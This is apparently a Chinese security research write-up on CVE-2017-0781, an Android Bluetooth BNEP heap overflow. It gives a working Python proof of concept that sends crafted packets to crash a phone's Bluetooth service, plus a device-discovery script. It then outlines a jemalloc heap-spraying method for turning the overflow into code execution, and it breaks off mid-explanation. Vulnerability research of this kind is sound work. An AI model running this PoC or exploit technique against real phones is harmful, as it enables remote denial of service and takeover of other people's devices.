来源：[先知安全技术社区](https://xianzhi.aliyun.com/forum/read/2287.html "先知安全技术社区")  
作者：thor@MS509Team
CVE-2017-0781是最近爆出的 Android 蓝牙栈的严重漏洞，允许攻击者远程获取Android手机的命令执行权限，危害相当大。armis
给出的文档[1]中详细介绍了该漏洞的成因，但是并没有给出 PoC 和 Exploit，我们只好根据文档中的介绍自己摸索尝试编写 Exploit。
#### 0x00 测试环境
  1. Android 手机: Nexus 6p 
  2. Android 系统版本: android 7.0 userdebug
  3. Ubuntu 16 + USB 蓝牙适配器
为了调试方便，nexus 6p 刷了自己编译的 AOSP 7.0 userdebug 版本。
#### 0x01 漏洞原理
CVE-2017-0781是一个堆溢出漏洞，漏洞位置在`bnep\_data\_ind`函数中，如下所示：
`p\_bcb->p\_pending\_data`指向申请的堆内存空间，但是`memcpy`的时候目的地址却是`p\_bcb->p\_pending\_data
+
1`，复制内存时目的地址往后扩展了`sizeof(p\_pending\_data)`字节，导致堆溢出。`p\_pending\_data`指向的是一个8个字节的结构体`BT\_HDR`，所以这里将会导致8个字节的堆溢出。
该漏洞看上去十分明显，但是由于这是蓝牙`bnep`协议的扩展部分，所以估计测试都没覆盖到。
#### 0x02 PoC编写
该漏洞是蓝牙协议栈中 BNEP 协议处理时出现的漏洞，因此 PoC 的编写就是要向 Android 手机发送伪造的 bnep 协议包就行了。我们这里使用
pybluez 实现蓝牙发包，可以直接在 Ubutnu 上通过 pip 安装。armis 的文档中给出了触发漏洞的 bnep 协议包格式：
PoC如下所示：
        import bluetooth,sys
        def poc(target):
            pkt = '\x81\x01\x00'+ '\x41'*8 
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.connect((target, 0xf))
            for i in range(1000):
                sock.send(pkt)
                data = sock.recv(1024)
            sock.close()
        if __name__ == "__main__":
           if len(sys.argv) python poc.py `
其中 target 是目标手机的蓝牙 MAC 地址，类似于 wifi 的 MAC 地址。PoC 编写好后我们可以开始测试了，首先打开手机的蓝牙，然后我们在
Ubuntu 上运行以下脚本来查找附近的蓝牙设备：
        import bluetooth
        nearby_devices = bluetooth.discover_devices(lookup_names=True)
        print("found %d devices" % len(nearby_devices))
        for addr, name in nearby_devices:
            print("  %s - %s" % (addr, name))
运行结果如下：
发现的 AOSP 蓝牙设备就是我们的测试手机。直接运行 PoC，并通过 adb logcat 查看测试手机的日志：
可以看到我们的 PoC
直接远程让手机上的蓝牙服务崩溃，并且寄存器中出现了我们指定的内容，说明我们成功实现了堆溢出，覆盖了堆中的某些数据，导致蓝牙服务程序出现内存访问错误。至此，我们的
PoC 已经实现了远程使 android 手机蓝牙功能拒绝服务，下一步就是从堆溢出到获取命令执行权限的过程。
#### 0x03 Exploit 编写
Android 使用的是 jemalloc 来管理堆内存，分配堆内存的时候内存块之间是没有元数据的，因此无法使用 ptmalloc
中覆盖元数据的漏洞利用方法。我们也是刚开始接触
jemalloc，参考了[2]中的漏洞利用方法，发现由于该漏洞只能溢出8个字节的限制，似乎都不太好用。摸索好久最后发现只有期望于能够覆盖堆中的某些数据结构，而这些结构包含函数指针，从而获取代码执行权限。
我们知道 jemalloc 使用 run 来管理堆内存块，相同大小的堆内存在同一个 run
中挨着存放。因此，只要我们构造与目标数据结构相同大小的内存块，那么通过大量堆喷，则极有可能覆盖掉目标数据结构的前8个字节。该漏洞有一个优势就是我们可以控制申请的内存块大小，那么理论上我们就可以覆盖堆上绝大部分数据结构。
经过我们不断调试和测试，我们发现当我们申请的内存大小为32字节时，通过大量堆喷，我们可以覆盖`fixed\_queue\_t`数据结构的前8个字节，而该数据结构被蓝牙协议栈频繁使用：
        typedef struct fixed_queue_t {
          list_t* list;
          semaphore_t* enqueue_sem;
          semaphore_t* dequeue_sem;
          std::mutex* mutex;
          size_t capacity;
          reactor_object_t* dequeue_object;
          fixed_queue_cb dequeue_ready;
          void* dequeue_context;
        } fixed_queue_t;
我们覆盖的8个字节刚好能够覆盖 `list` 指针，`list` 结构体如下：
        typedef struct list_t {
          list_node_t* head;
          list_node_t* tail;
          size_t length;
          list_free_cb free_cb;
          const allocator_t* allocator;
        } list_t;
可以看到该结构体包含一个`list\_free\_cb`类型的变量，而该类型恰好为一个函数指针：
    typedef void (list_free_cb)(void data);